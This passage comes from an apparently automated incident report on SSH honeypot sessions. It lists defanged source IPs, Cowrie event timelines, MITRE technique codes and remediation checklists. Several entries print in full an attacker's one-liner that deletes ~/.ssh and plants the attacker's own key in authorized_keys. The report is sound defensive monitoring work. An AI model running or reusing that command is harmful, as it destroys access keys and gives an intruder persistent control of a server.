| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:34:36` | `cowrie.session.connect` |
| `2026-04-25 12:34:36` | `cowrie.client.version` |
| `2026-04-25 12:34:36` | `cowrie.client.kex` |
| `2026-04-25 12:34:37` | `cowrie.login.success` |
| `2026-04-25 12:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.181[.]139` to AbuseIPDB if not already reported
- [ ] Block `159.203.181[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f13ba55be08b

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:34 |
| **Last Seen** | 2026-04-25 12:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:34:37` | `cowrie.session.connect` |
| `2026-04-25 12:34:37` | `cowrie.client.version` |
| `2026-04-25 12:34:37` | `cowrie.client.kex` |
| `2026-04-25 12:34:38` | `cowrie.login.success` |
| `2026-04-25 12:34:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae6422ecec82

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:36 |
| **Last Seen** | 2026-04-25 12:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:36:43` | `cowrie.session.connect` |
| `2026-04-25 12:36:43` | `cowrie.client.version` |
| `2026-04-25 12:36:43` | `cowrie.client.kex` |
| `2026-04-25 12:36:45` | `cowrie.login.success` |
| `2026-04-25 12:36:45` | `cowrie.session.params` |
| `2026-04-25 12:36:45` | `cowrie.command.input` |
| `2026-04-25 12:36:45` | `cowrie.command.failed` |
| `2026-04-25 12:36:46` | `cowrie.log.closed` |
| `2026-04-25 12:36:46` | `cowrie.session.params` |
| `2026-04-25 12:36:46` | `cowrie.command.input` |
| `2026-04-25 12:36:47` | `cowrie.session.file_download` |
| `2026-04-25 12:36:47` | `cowrie.log.closed` |
| `2026-04-25 12:36:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50d8071324d1

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:36 |
| **Last Seen** | 2026-04-25 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:36:50` | `cowrie.session.connect` |
| `2026-04-25 12:36:50` | `cowrie.client.version` |
| `2026-04-25 12:36:51` | `cowrie.client.kex` |
| `2026-04-25 12:36:52` | `cowrie.login.success` |
| `2026-04-25 12:36:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-177e9f938c08

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:37 |
| **Last Seen** | 2026-04-25 12:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:37:38` | `cowrie.session.connect` |
| `2026-04-25 12:37:38` | `cowrie.client.version` |
| `2026-04-25 12:37:39` | `cowrie.client.kex` |
| `2026-04-25 12:37:40` | `cowrie.login.success` |
| `2026-04-25 12:37:41` | `cowrie.session.params` |
| `2026-04-25 12:37:41` | `cowrie.command.input` |
| `2026-04-25 12:37:41` | `cowrie.command.failed` |
| `2026-04-25 12:37:41` | `cowrie.log.closed` |
| `2026-04-25 12:37:42` | `cowrie.session.params` |
| `2026-04-25 12:37:42` | `cowrie.command.input` |
| `2026-04-25 12:37:42` | `cowrie.session.file_download` |
| `2026-04-25 12:37:42` | `cowrie.log.closed` |
| `2026-04-25 12:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3f6997c8fcb

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:37 |
| **Last Seen** | 2026-04-25 12:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:37:45` | `cowrie.session.connect` |
| `2026-04-25 12:37:45` | `cowrie.client.version` |
| `2026-04-25 12:37:46` | `cowrie.client.kex` |
| `2026-04-25 12:37:47` | `cowrie.login.success` |
| `2026-04-25 12:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d50d366de9b

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:38 |
| **Last Seen** | 2026-04-25 12:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:38:30` | `cowrie.session.connect` |
| `2026-04-25 12:38:30` | `cowrie.client.version` |
| `2026-04-25 12:38:30` | `cowrie.client.kex` |
| `2026-04-25 12:38:31` | `cowrie.login.success` |
| `2026-04-25 12:38:32` | `cowrie.session.params` |
| `2026-04-25 12:38:32` | `cowrie.command.input` |
| `2026-04-25 12:38:32` | `cowrie.command.failed` |
| `2026-04-25 12:38:32` | `cowrie.log.closed` |
| `2026-04-25 12:38:33` | `cowrie.session.params` |
| `2026-04-25 12:38:33` | `cowrie.command.input` |
| `2026-04-25 12:38:33` | `cowrie.session.file_download` |
| `2026-04-25 12:38:33` | `cowrie.log.closed` |
| `2026-04-25 12:38:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a024fea05d4

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:38 |
| **Last Seen** | 2026-04-25 12:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:38:36` | `cowrie.session.connect` |
| `2026-04-25 12:38:36` | `cowrie.client.version` |
| `2026-04-25 12:38:37` | `cowrie.client.kex` |
| `2026-04-25 12:38:38` | `cowrie.login.success` |
| `2026-04-25 12:38:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b21e73953ad

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:39 |
| **Last Seen** | 2026-04-25 12:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:39:12` | `cowrie.session.connect` |
| `2026-04-25 12:39:12` | `cowrie.client.version` |
| `2026-04-25 12:39:12` | `cowrie.client.kex` |
| `2026-04-25 12:39:12` | `cowrie.login.success` |
| `2026-04-25 12:39:12` | `cowrie.session.params` |
| `2026-04-25 12:39:12` | `cowrie.command.input` |
| `2026-04-25 12:39:12` | `cowrie.command.failed` |
| `2026-04-25 12:39:12` | `cowrie.log.closed` |
| `2026-04-25 12:39:12` | `cowrie.session.params` |
| `2026-04-25 12:39:12` | `cowrie.command.input` |
| `2026-04-25 12:39:12` | `cowrie.session.file_download` |
| `2026-04-25 12:39:12` | `cowrie.log.closed` |
| `2026-04-25 12:39:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-991982c70e76

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:39 |
| **Last Seen** | 2026-04-25 12:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:39:14` | `cowrie.session.connect` |
| `2026-04-25 12:39:14` | `cowrie.client.version` |
| `2026-04-25 12:39:14` | `cowrie.client.kex` |
| `2026-04-25 12:39:14` | `cowrie.login.success` |
| `2026-04-25 12:39:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-007d09676e7a

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:39 |
| **Last Seen** | 2026-04-25 12:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:39:36` | `cowrie.session.connect` |
| `2026-04-25 12:39:36` | `cowrie.client.version` |
| `2026-04-25 12:39:36` | `cowrie.client.kex` |
| `2026-04-25 12:39:38` | `cowrie.login.success` |
| `2026-04-25 12:39:38` | `cowrie.session.params` |
| `2026-04-25 12:39:38` | `cowrie.command.input` |
| `2026-04-25 12:39:38` | `cowrie.command.failed` |
| `2026-04-25 12:39:39` | `cowrie.log.closed` |
| `2026-04-25 12:39:39` | `cowrie.session.params` |
| `2026-04-25 12:39:39` | `cowrie.command.input` |
| `2026-04-25 12:39:40` | `cowrie.session.file_download` |
| `2026-04-25 12:39:40` | `cowrie.log.closed` |
| `2026-04-25 12:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-629f3be5a4f9

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:39 |
| **Last Seen** | 2026-04-25 12:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:39:43` | `cowrie.session.connect` |
| `2026-04-25 12:39:43` | `cowrie.client.version` |
| `2026-04-25 12:39:43` | `cowrie.client.kex` |
| `2026-04-25 12:39:45` | `cowrie.login.success` |
| `2026-04-25 12:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53c7957cc4be

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:41 |
| **Last Seen** | 2026-04-25 12:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:41:02` | `cowrie.session.connect` |
| `2026-04-25 12:41:02` | `cowrie.client.version` |
| `2026-04-25 12:41:02` | `cowrie.client.kex` |
| `2026-04-25 12:41:02` | `cowrie.login.success` |
| `2026-04-25 12:41:02` | `cowrie.session.params` |
| `2026-04-25 12:41:02` | `cowrie.command.input` |
| `2026-04-25 12:41:02` | `cowrie.command.failed` |
| `2026-04-25 12:41:02` | `cowrie.log.closed` |
| `2026-04-25 12:41:03` | `cowrie.session.params` |
| `2026-04-25 12:41:03` | `cowrie.command.input` |
| `2026-04-25 12:41:03` | `cowrie.session.file_download` |
| `2026-04-25 12:41:03` | `cowrie.log.closed` |
| `2026-04-25 12:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bae2a0df2f3

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:41 |
| **Last Seen** | 2026-04-25 12:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:41:04` | `cowrie.session.connect` |
| `2026-04-25 12:41:04` | `cowrie.client.version` |
| `2026-04-25 12:41:04` | `cowrie.client.kex` |
| `2026-04-25 12:41:05` | `cowrie.login.success` |
| `2026-04-25 12:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba27366722af

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:42 |
| **Last Seen** | 2026-04-25 12:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:42:26` | `cowrie.session.connect` |
| `2026-04-25 12:42:26` | `cowrie.client.version` |
| `2026-04-25 12:42:27` | `cowrie.client.kex` |
| `2026-04-25 12:42:28` | `cowrie.login.success` |
| `2026-04-25 12:42:29` | `cowrie.session.params` |
| `2026-04-25 12:42:29` | `cowrie.command.input` |
| `2026-04-25 12:42:29` | `cowrie.command.failed` |
| `2026-04-25 12:42:29` | `cowrie.log.closed` |
| `2026-04-25 12:42:29` | `cowrie.session.params` |
| `2026-04-25 12:42:29` | `cowrie.command.input` |
| `2026-04-25 12:42:30` | `cowrie.session.file_download` |
| `2026-04-25 12:42:30` | `cowrie.log.closed` |
| `2026-04-25 12:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eed783a080b

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]88` |
| **First Seen** | 2026-04-25 12:42 |
| **Last Seen** | 2026-04-25 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:42:33` | `cowrie.session.connect` |
| `2026-04-25 12:42:33` | `cowrie.client.version` |
| `2026-04-25 12:42:34` | `cowrie.client.kex` |
| `2026-04-25 12:42:35` | `cowrie.login.success` |
| `2026-04-25 12:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]88` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1992a926be39

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:42 |
| **Last Seen** | 2026-04-25 12:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:42:59` | `cowrie.session.connect` |
| `2026-04-25 12:42:59` | `cowrie.client.version` |
| `2026-04-25 12:43:00` | `cowrie.client.kex` |
| `2026-04-25 12:43:01` | `cowrie.login.success` |
| `2026-04-25 12:43:02` | `cowrie.session.params` |
| `2026-04-25 12:43:02` | `cowrie.command.input` |
| `2026-04-25 12:43:02` | `cowrie.command.failed` |
| `2026-04-25 12:43:02` | `cowrie.log.closed` |
| `2026-04-25 12:43:03` | `cowrie.session.params` |
| `2026-04-25 12:43:03` | `cowrie.command.input` |
| `2026-04-25 12:43:03` | `cowrie.session.file_download` |
| `2026-04-25 12:43:03` | `cowrie.log.closed` |
| `2026-04-25 12:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83653275fc3c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-04-25 12:43 |
| **Last Seen** | 2026-04-25 12:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:43:06` | `cowrie.session.connect` |
| `2026-04-25 12:43:06` | `cowrie.client.version` |
| `2026-04-25 12:43:07` | `cowrie.client.kex` |
| `2026-04-25 12:43:08` | `cowrie.login.success` |
| `2026-04-25 12:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccd66d0481c1

| Field | Detail |
|---|---|
